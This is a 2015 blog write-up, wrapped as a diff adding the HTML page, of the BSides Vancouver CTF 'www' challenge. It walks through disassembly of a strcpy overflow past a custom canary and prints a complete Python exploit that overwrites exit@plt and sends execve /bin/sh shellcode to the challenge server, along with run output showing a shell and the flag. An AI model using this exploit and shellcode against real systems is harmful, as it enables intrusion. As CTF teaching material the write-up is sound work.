@@ -1,0 +1,471 @@
+
+<!DOCTYPE html>
+<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
+<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
+<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  <title>BSides Vancouver CTF - WWW - staring into /dev/null</title>
+  <meta name="author" content="barrebas">
+
+  
+  <meta name="description" content="After solving sushi, there were plenty of pwnables left to choose from. Next up was www! www was a 200 point challenge and consisted of a 32-bit &hellip;">
+  
+
+  <!-- http://t.co/dKP3o1e -->
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  
+  <link rel="canonical" href="http://barrebas.github.io/blog/2015/03/18/bsides-vancouver-ctf-www">
+  <link href="/favicon.png" rel="icon">
+  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
+  <link href="/atom.xml" rel="alternate" title="staring into /dev/null" type="application/atom+xml">
+  <script src="/javascripts/modernizr-2.0.js"></script>
+  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
+  <script>!window.jQuery && document.write(unescape('%3Cscript src="./javascripts/libs/jquery.min.js"%3E%3C/script%3E'))</script>
+  <script src="/javascripts/octopress.js" type="text/javascript"></script>
+  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
+<link href="//fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+<link href="//fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+
+  
+
+</head>
+
+<body   >
+  <header role="banner"><hgroup>
+  <h1><a href="/">staring into /dev/null</a></h1>
+  
+    <h2>barrebas</h2>
+  
+</hgroup>
+
+</header>
+  <nav role="navigation"><ul class="subscription" data-subscription="rss">
+  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
+  
+</ul>
+  
+<form action="https://www.google.com/search" method="get">
+  <fieldset role="search">
+    <input type="hidden" name="q" value="site:barrebas.github.io" />
+    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
+  </fieldset>
+</form>
+  
+<ul class="main-navigation">
+  <li><a href="/">Blog</a></li>
+  <li><a href="/blog/archives">Archives</a></li>
+</ul>
+
+</nav>
+  <div id="main">
+    <div id="content">
+      <div>
+<article class="hentry" role="article">
+  
+  <header>
+    
+      <h1 class="entry-title">BSides Vancouver CTF - WWW</h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2015-03-18T20:36:56+01:00'><span class='date'><span class='date-month'>Mar</span> <span class='date-day'>18</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>8:36 pm</span></time>
+        
+      </p>
+    
+  </header>
+
+
+<div class="entry-content"><p>After solving <code>sushi</code>, there were plenty of pwnables left to choose from. Next up was <code>www</code>!</p>
+
+<!-- more -->
+
+
+<p><code>www</code> was a 200 point challenge and consisted of a 32-bit Linux binary. After dealing with <code>sushi</code>, I decided to inspect the binary in <code>gdb-peda</code> right away:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>gdb-peda<span class="nv">$ </span>checksec
+</span><span class='line'>CANARY    : disabled
+</span><span class='line'>FORTIFY   : disabled
+</span><span class='line'>NX        : disabled
+</span><span class='line'>PIE       : disabled
+</span><span class='line'>RELRO     : disabled
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Again, no protections in place. Running the binary reveals what it is trying to do:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>gdb-peda<span class="nv">$ </span>r
+</span><span class='line'>Welcome to www! Please give me two strings to have them echoed back to you!
+</span><span class='line'>buffers at 0xffffd4c4 and 0xffffd3c4, ready <span class="k">for</span> input!
+</span><span class='line'>AAAAAA
+</span><span class='line'>BBBBBB
+</span><span class='line'>AAAAAA
+</span><span class='line'>
+</span><span class='line'>BBBBBB
+</span><span class='line'>
+</span><span class='line'>Stack canary created: &gt;tC<span class="o">[</span>hbw<span class="o">]</span>
+</span><span class='line'>Better luck next <span class="nb">time</span>, eh?
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Looks like it has two buffers on the stack and a custom stack canary implementation. The vulnerable function is called <code>copybuf</code>:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>0804873c &lt;copybuf&gt;:
+</span><span class='line'> 804873c: <span class="m">55</span>                      push   ebp
+</span><span class='line'> 804873d: <span class="m">89</span> e5                   mov    ebp,esp
+</span><span class='line'> 804873f: <span class="m">83</span> ec <span class="m">38</span>                sub    esp,0x38
+</span><span class='line'> 8048742: c7 <span class="m">44</span> <span class="m">24</span> <span class="m">08</span> <span class="m">09</span> <span class="m">00</span> <span class="m">00</span>    mov    DWORD PTR <span class="o">[</span>esp+0x8<span class="o">]</span>,0x9
+</span><span class='line'> 8048749: <span class="m">00</span>
+</span><span class='line'> 804874a: c7 <span class="m">44</span> <span class="m">24</span> <span class="m">04</span> <span class="m">68</span> 9d <span class="m">04</span>    mov    DWORD PTR <span class="o">[</span>esp+0x4<span class="o">]</span>,0x8049d68 <span class="p">;</span> canary
+</span><span class='line'> 8048751: <span class="m">08</span>
+</span><span class='line'> 8048752: 8d <span class="m">45</span> eb                lea    eax,<span class="o">[</span>ebp-0x15<span class="o">]</span>
+</span><span class='line'> 8048755: <span class="m">89</span> <span class="m">04</span> <span class="m">24</span>                mov    DWORD PTR <span class="o">[</span>esp<span class="o">]</span>,eax
+</span><span class='line'> 8048758: e8 c3 fe ff ff          call   <span class="m">8048620</span> &lt;strncpy@plt&gt;
+</span><span class='line'> 804875d: 8b <span class="m">45</span> <span class="m">08</span>                mov    eax,DWORD PTR <span class="o">[</span>ebp+0x8<span class="o">]</span>
+</span><span class='line'> 8048760: <span class="m">89</span> <span class="m">44</span> <span class="m">24</span> <span class="m">04</span>             mov    DWORD PTR <span class="o">[</span>esp+0x4<span class="o">]</span>,eax
+</span><span class='line'> 8048764: 8d <span class="m">45</span> db                lea    eax,<span class="o">[</span>ebp-0x25<span class="o">]</span>                <span class="p">;</span> first buffer is copied here
+</span><span class='line'> 8048767: <span class="m">89</span> <span class="m">04</span> <span class="m">24</span>                mov    DWORD PTR <span class="o">[</span>esp<span class="o">]</span>,eax
+</span><span class='line'> 804876a: e8 <span class="m">41</span> fe ff ff          call   80485b0 &lt;strcpy@plt&gt;
+</span><span class='line'> 804876f: 8b <span class="m">45</span> 0c                mov    eax,DWORD PTR <span class="o">[</span>ebp+0xc<span class="o">]</span>       <span class="p">;</span> ebp+0xc <span class="o">=</span> second input
+</span><span class='line'> 8048772: <span class="m">89</span> <span class="m">44</span> <span class="m">24</span> <span class="m">04</span>             mov    DWORD PTR <span class="o">[</span>esp+0x4<span class="o">]</span>,eax            
+</span><span class='line'> 8048776: 8b <span class="m">45</span> <span class="m">08</span>                mov    eax,DWORD PTR <span class="o">[</span>ebp+0x8<span class="o">]</span>       <span class="p">;</span> overflow this pointer with <span class="nb">exit</span>@got
+</span><span class='line'> 8048779: <span class="m">89</span> <span class="m">04</span> <span class="m">24</span>                mov    DWORD PTR <span class="o">[</span>esp<span class="o">]</span>,eax
+</span><span class='line'> 804877c: e8 2f fe ff ff          call   80485b0 &lt;strcpy@plt&gt;
+</span><span class='line'> <span class="p">;</span> check_cookie:
+</span><span class='line'> 8048781: c7 <span class="m">44</span> <span class="m">24</span> <span class="m">04</span> <span class="m">68</span> 9d <span class="m">04</span>    mov    DWORD PTR <span class="o">[</span>esp+0x4<span class="o">]</span>,0x8049d68 <span class="p">;</span> canary
+</span><span class='line'> 8048788: <span class="m">08</span>
+</span><span class='line'> 8048789: 8d <span class="m">45</span> eb                lea    eax,<span class="o">[</span>ebp-0x15<span class="o">]</span>
+</span><span class='line'> 804878c: <span class="m">89</span> <span class="m">04</span> <span class="m">24</span>                mov    DWORD PTR <span class="o">[</span>esp<span class="o">]</span>,eax
+</span><span class='line'> 804878f: e8 bc fd ff ff          call   <span class="m">8048550</span> &lt;strcmp@plt&gt;
+</span><span class='line'> 8048794: <span class="m">89</span> <span class="m">45</span> f4                mov    DWORD PTR <span class="o">[</span>ebp-0xc<span class="o">]</span>,eax
+</span><span class='line'> 8048797: <span class="m">83</span> 7d f4 <span class="m">00</span>             cmp    DWORD PTR <span class="o">[</span>ebp-0xc<span class="o">]</span>,0x0
+</span><span class='line'> 804879b: <span class="m">74</span> <span class="m">18</span>                   je     80487b5 &lt;copybuf+0x79&gt;        <span class="p">;</span> <span class="k">if</span> canary check fails, call <span class="nb">exit</span>@plt -&gt; overwrite
+</span><span class='line'> 804879d: c7 <span class="m">04</span> <span class="m">24</span> <span class="m">30</span> 8a <span class="m">04</span> <span class="m">08</span>    mov    DWORD PTR <span class="o">[</span>esp<span class="o">]</span>,0x8048a30
+</span><span class='line'> 80487a4: e8 <span class="m">17</span> fe ff ff          call   80485c0 &lt;puts@plt&gt;
+</span><span class='line'> 80487a9: c7 <span class="m">04</span> <span class="m">24</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span>    mov    DWORD PTR <span class="o">[</span>esp<span class="o">]</span>,0x0
+</span><span class='line'> 80487b0: e8 2b fe ff ff          call   80485e0 &lt;<span class="nb">exit</span>@plt&gt;
+</span><span class='line'> <span class="p">;</span> cookie_OK:
+</span><span class='line'> 80487b5: c9                      leave
+</span><span class='line'> 80487b6: c3                      ret
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>In short, the program takes two inputs and uses <code>strcpy()</code> to copy these to the stack. However, the saved return address on the stack is protected from overwriting by a custom stack canary. The way around is to exploit the buffer overflow to overwrite on of the arguments to the second <code>strcpy()</code>: the pointer to the second buffer. If we control that pointer, we basically have a write-what-where. I choose to overflow the pointer to the second buffer with the address of <code>exit@plt</code>. This way, after overwriting the stack canary, the program will try to exit, but <code>exit@plt</code> will point to attacker-controlled shellcode on the stack.</p>
+
+<p>Putting it all together:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+<span class='line-number'>45</span>
+</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="kn">from</span> <span class="nn">socket</span> <span class="kn">import</span> <span class="o">*</span>
+</span><span class='line'><span class="kn">import</span> <span class="nn">struct</span><span class="o">,</span> <span class="nn">telnetlib</span><span class="o">,</span> <span class="nn">re</span>
+</span><span class='line'>
+</span><span class='line'><span class="k">def</span> <span class="nf">p</span><span class="p">(</span><span class="n">x</span><span class="p">):</span>
+</span><span class='line'>  <span class="k">return</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&#39;&lt;L&#39;</span><span class="p">,</span> <span class="n">x</span><span class="p">)</span>
+</span><span class='line'>
+</span><span class='line'><span class="k">def</span> <span class="nf">pQ</span><span class="p">(</span><span class="n">x</span><span class="p">):</span>
+</span><span class='line'>  <span class="k">return</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&#39;&lt;Q&#39;</span><span class="p">,</span> <span class="n">x</span><span class="p">)</span>
+</span><span class='line'>  
+</span><span class='line'><span class="n">s</span><span class="o">=</span><span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">)</span>
+</span><span class='line'><span class="c">#s.connect((&#39;localhost&#39;, 17284))</span>
+</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s">&#39;www.termsec.net&#39;</span><span class="p">,</span> <span class="mi">17284</span><span class="p">))</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">buf</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">200</span><span class="p">)</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">m</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="s">&#39;(0x[0-9a-f]+)&#39;</span><span class="p">,</span> <span class="n">buf</span><span class="p">)</span>
+</span><span class='line'><span class="n">buf1_addr</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">m</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span>
+</span><span class='line'><span class="n">buf2_addr</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">m</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span>
+</span><span class='line'>
+</span><span class='line'><span class="k">print</span> <span class="s">&quot;[~] buf1: 0x</span><span class="si">%lx</span><span class="s">&quot;</span> <span class="o">%</span> <span class="n">buf1_addr</span>
+</span><span class='line'><span class="k">print</span> <span class="s">&quot;[~] buf2: 0x</span><span class="si">%lx</span><span class="s">&quot;</span> <span class="o">%</span> <span class="n">buf2_addr</span>
+</span><span class='line'>
+</span><span class='line'><span class="c"># first input will overwrite the pointer that is used for the second strcpy </span>
+</span><span class='line'><span class="n">payload</span> <span class="o">=</span> <span class="s">&quot;&quot;</span>
+</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="s">&quot;A&quot;</span><span class="o">*</span><span class="mi">45</span>       <span class="c"># padding</span>
+</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x8049d10</span><span class="p">)</span>    <span class="c"># we&#39;ll overwrite exit@plt</span>
+</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="n">buf2_addr</span><span class="p">)</span> <span class="c"># restore this on the stack, otherwise it will be partially overwritten</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span> <span class="o">+</span> <span class="s">&quot;</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">)</span>
+</span><span class='line'>
+</span><span class='line'><span class="c"># second input, used in second strcpy. By now, that strcpy will call:</span>
+</span><span class='line'><span class="c"># strcpy(0x8049d10, buffer2)</span>
+</span><span class='line'><span class="n">payload</span> <span class="o">=</span> <span class="s">&quot;&quot;</span>
+</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="n">buf2_addr</span><span class="o">+</span><span class="mi">4</span><span class="p">)</span>    <span class="c"># overwrite exit@plt with the address where the shellcode starts</span>
+</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="s">&quot;</span><span class="se">\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x8d\x54\x24\x08\x50\x53\x8d\x0c\x24\xb0\x0b\xcd\x80\x31\xc0\xb0\x01\xcd\x80</span><span class="s">&quot;</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span> <span class="o">+</span> <span class="s">&quot;</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">)</span>
+</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">200</span><span class="p">)</span>
+</span><span class='line'>
+</span><span class='line'><span class="k">print</span> <span class="s">&quot;[!] enjoy your shell&quot;</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">t</span> <span class="o">=</span> <span class="n">telnetlib</span><span class="o">.</span><span class="n">Telnet</span><span class="p">()</span>
+</span><span class='line'><span class="n">t</span><span class="o">.</span><span class="n">sock</span> <span class="o">=</span> <span class="n">s</span>
+</span><span class='line'><span class="n">t</span><span class="o">.</span><span class="n">interact</span><span class="p">()</span>
+</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>bas@tritonal:~/tmp/yvrctf/www-200<span class="nv">$ </span>python ./www.py
+</span><span class='line'><span class="o">[</span>~<span class="o">]</span> buf1: 0xbfa660d4
+</span><span class='line'><span class="o">[</span>~<span class="o">]</span> buf2: 0xbfa65fd4
+</span><span class='line'>
+</span><span class='line'><span class="o">[</span>!<span class="o">]</span> enjoy your shell
+</span><span class='line'>id
+</span><span class='line'>/bin//sh: 1: id: not found
+</span><span class='line'>cat flag.txt
+</span><span class='line'>flag<span class="o">{</span>K33P_ST4T1C_L1K3_W00L_F4BR1C<span class="o">}</span>
+</span></code></pre></td></tr></table></div></figure>
+
+</div>
+
+
+  <footer>
+    <p class="meta">
+      
+  
+
+<span class="byline author vcard">Posted by <span class="fn">barrebas</span></span>
+
+      
+
+
+
+
+<time class='entry-date' datetime='2015-03-18T20:36:56+01:00'><span class='date'><span class='date-month'>Mar</span> <span class='date-day'>18</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>8:36 pm</span></time>
+      
+
+<span class="categories">
+  
+    <a class='category' href='/blog/categories/bsides/'>bsides</a>, <a class='category' href='/blog/categories/ctf/'>ctf</a>, <a class='category' href='/blog/categories/pwnable/'>pwnable</a>
+  
+</span>
+
+
+    </p>
+    
+      <div class="sharing">
+  
+  <a href="//twitter.com/share" class="twitter-share-button" data-url="http://barrebas.github.io/blog/2015/03/18/bsides-vancouver-ctf-www/" data-via="barrebas" data-counturl="http://barrebas.github.io/blog/2015/03/18/bsides-vancouver-ctf-www/" >Tweet</a>
+  
+  
+  
+</div>
+
+    
+    <p class="meta">
+      
+        <a class="basic-alignment left" href="/blog/2015/03/18/bsides-vancouver-ctf-sushi/" title="Previous Post: BSides Vancouver CTF - Sushi">&laquo; BSides Vancouver CTF - Sushi</a>
+      
+      
+    </p>
+  </footer>
+</article>
+
+  <section>
+    <h1>Comments</h1>
+    <div id="disqus_thread" aria-live="polite"><noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+</div>
+  </section>
+
+</div>
+
+<aside class="sidebar">
+  
+    <section>
+  <h1>Recent Posts</h1>
+  <ul id="recent_posts">
+    
+      <li class="post">
+        <a href="/blog/2015/03/18/bsides-vancouver-ctf-www/">BSides Vancouver CTF - WWW</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/03/18/bsides-vancouver-ctf-sushi/">BSides Vancouver CTF - Sushi</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/02/22/maximum-overkill-two-from-format-string-vulnerability-to-remote-code-execution/">Maximum Overkill Two - From Format String Vulnerability to Remote Code Execution</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/02/09/solving-the-x86-64-shellcoding-challenges-of-ringzer0ctf/">Solving the X86-64 Shellcoding Challenges of RingZer0CTF</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/02/01/semi-weekly-roundup-2015-number-3/">(Semi) Weekly Roundup 2015 #3</a>
+      </li>
+    
+  </ul>
+</section>
+
+
+
+
+
+  
+</aside>
+
+
+    </div>
+  </div>
+  <footer role="contentinfo"><p>
+  Copyright &copy; 2015 - barrebas -
+  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
+</p>
+
+</footer>
+  
+
+<script type="text/javascript">
+      var disqus_shortname = 'barrebas';
+      
+        
+        // var disqus_developer = 1;
+        var disqus_identifier = 'http://barrebas.github.io/blog/2015/03/18/bsides-vancouver-ctf-www/';
+        var disqus_url = 'http://barrebas.github.io/blog/2015/03/18/bsides-vancouver-ctf-www/';
+        var disqus_script = 'embed.js';
+      
+    (function () {
+      var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+      dsq.src = '//' + disqus_shortname + '.disqus.com/' + disqus_script;
+      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    }());
+</script>
+
+
+
+
+
+
+
+  <script type="text/javascript">
+    (function(){
+      var twitterWidgets = document.createElement('script');
+      twitterWidgets.type = 'text/javascript';
+      twitterWidgets.async = true;
+      twitterWidgets.src = '//platform.twitter.com/widgets.js';
+      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
+    })();
+  </script>
+
+
+
+
+
+</body>
+</html>
